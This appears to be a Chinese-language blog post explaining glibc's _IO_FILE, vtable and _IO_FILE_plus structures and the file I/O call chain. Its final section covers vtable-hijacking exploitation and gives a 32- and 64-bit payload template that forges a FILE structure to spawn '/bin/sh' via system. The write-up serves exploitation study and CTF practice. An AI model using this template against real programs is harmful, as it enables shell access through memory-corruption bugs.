---
title: _IO_FILE 结构与利用
description: 
categories:
tags: 
grammar_cjkRuby: true
---

### 前置
1. 打开一个文件时,会在堆上创建一个_IO_FILE_plus结构,并返回一个FILE类型指针

### \_IO_list_all
> 一个记录了所有 \_IO_FILE_plus 结构的单向链表

### FILE
1. \_IO_FILE
> 描述文件的一个结构体

```cpp
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;
//省略了一些成员
};


```

2. IO_jump_t
> 一个vtable, 有对文件进行读写的函数指针

```cpp
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);         // 7
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);         // 8
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);                
    JUMP_FIELD(_IO_write_t, __write);               
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};

```

3.  \_IO_FILE_plus
> 封装了上面两个结构

```cpp
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable; // 64位偏移为 0xd8, 32位下偏移为0x94
};
```

## 文件IO操作
> 从IO库函数 --> FILE文件结构 --> 文件结构vtable中对应的函数 --> 系统调用

### 打开与关闭文件
#### fopen()
> FILE *fopen(char *filename, char *type);

1. 在堆中创建FILE结构, 并根据打开的模式初始化vtable
2. 把新创建的_IO_FILE_plus挂载到 \_IO_list_all 上面
3. 系统调用打开文件,并返回FILE类型指针

#### fclose()
> int fclose(FILE *stream);

1. 将_IO_FILE_plus从_IO_list_all上取下来
2. 调用close函数,(通过系统调用)关闭文件
3. 通过vtable中的函数指针: \_IO_FINISH 调用 \_IO_file_finish()函数, free 掉FILE结构

### 文件读写
> IO_Func --> vtable --> vtable_func_ptr --> vtable_func --> syscall

#### fread()
> size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;

+ 调用流程
> fread() --> \_IO_sgetn -->  \_IO_XSGETN(vtable中的函数指针) --> \_IO_file_xsgetn() --> 系统调用

#### fwrite()
> size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);

+ 调用流程
> fwrite() --> \_IO_xsputn --> \_IO_XSPUTN(vtable中的函数指针) --> \_IO_new_file_xsputn(调用同样位于vtable中的_IO_OVERFLOW) --> 系统调用

#### printf/puts
> 默认输出到 stdout

![printf/puts](https://www.github.com/Byzero512/blog_img/raw/master/1538553969841.png) 


## 利用
> 库函数堆文件进行操作,需要通过堆上的FILE结构体(进一步得通过vtable)来对文件进行操作, 这样子就为攻击提供了前提 
>  调用IO_FILE函数时, 函数的第一个参数都是一个指向_IO_FILE_pllus 的指针, 所以需要向\_IO_FILE_plus的起始处写入"/bin/sh\x00"


### 利用方式
> 1. exploit vtable

### vtable
+ 有两种: 
	+ 修改vtable中的函数指针: 
		1. leak vtable 的地址(leak libc)
		2.  任意写
	+ 伪造vtable
		1. 知道堆中_IO_jump_t \*vtable的地址并且能修改它
> 第二种方法更实际一点. 能leak libc也都不用

#### change vtable
> 直接修改位于libc中的 \_IO_jump_t 结构体(即vtable)中的函数指针为 system

+ 攻击前提
	1. 能leak vtable的地址(也就是说leak libc)
	2. 有任意写漏洞,能修改vtable中的函数指针
	3. 能往_IO_FILE_plus的起始处写入'/bin/sh\x00'

+ 局限性
	1. 只能在 glibc 2.23 之前的版本才能使用

#### fake vtable

+ 攻击前提
	1. 能控制_IO_FILE_plus的起始位置
	2. 能控制_IO_FILE_plus的指针成员vtable,使其指向位置的vtable
	3. 能在某段内存位置vtable

##### 利用模板
> vtable: 64位偏移为0xd8, 32位下偏移为0x94
> fake_lock_addr要指向一个为0x00的位置
```cpp
//#32 bits
fake_file = "/bin/sh\x00" + "\x00" * 0x40 + p32(fake_lock_addr)
fake_file = fake_file.ljust(0x94, "\x00")
fake_file += p32(fake_vtable_addr - 0x44)

//#64 bits
fake_file = "/bin/sh\x00" + '\x00' * 0x8
fake_file += p64(system) + '\x00' * 0x70
------------------the system can also be placed in other memory
fake_file += p64(fake_lock_addr)
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr
```